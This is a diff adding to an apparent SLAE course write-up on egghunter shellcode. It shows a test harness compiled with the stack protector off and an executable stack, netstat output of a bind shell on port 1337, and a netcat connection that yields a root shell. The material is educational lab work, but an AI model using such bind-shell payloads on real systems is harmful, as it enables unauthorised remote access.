@@ -80,3 +80,34 @@ For quick demo of our egghunter shellcode working with different payload, we col
 http://shell-storm.org/shellcode/files/shellcode-882.php
 This shellcode is length is 89 bytes & will perfrom bind TCP Shellcode Port 1337 on Linux x86 platform.
 
+Compile the shellcode & execute it on the x86 Linux system 
+
+root@kali:/home/SLAE/MY_EXP/Assignment3# gcc -fno-stack-protector -z execstack shellcode.c -o Egg_hunter_working_demo
+root@kali:/home/SLAE/MY_EXP/Assignment3# ./Egg_hunter_working_demo 
+Egg Hunter Shellcode Length:  39
+Final payload Shellcode Length:  97
+
+From another terminal we 1st check netstat -antp command for ensure is the TCP Port 1337 open or Not
+
+root@kali:/home/SLAE/MY_EXP/Assignment3# netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1786/sshd           
+tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      2227/./Egg_hunter_w 
+tcp        0      0 192.168.154.131:22      192.168.154.1:1503      TIME_WAIT   -                   
+tcp        0      0 192.168.154.131:22      192.168.154.1:1902      ESTABLISHED 2214/sshd: root@not 
+tcp6       0      0 :::22                   :::*                    LISTEN      1786/sshd         
+
+Yes, the TCP port 1337 is open.
+tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      2227/./Egg_hunter_w 
+
+From the terminal if we try to connect this TCP port we will get shell, for example :
+
+root@kali:/home/SLAE/MY_EXP/Assignment3# nc localhost 1337
+id
+uid=0(root) gid=0(root) groups=0(root)
+uname -a
+Linux kali 4.4.0-kali1-686 #1 SMP Debian 4.4.2-3kali1 (2016-02-23) i686 GNU/Linux
+
+
+
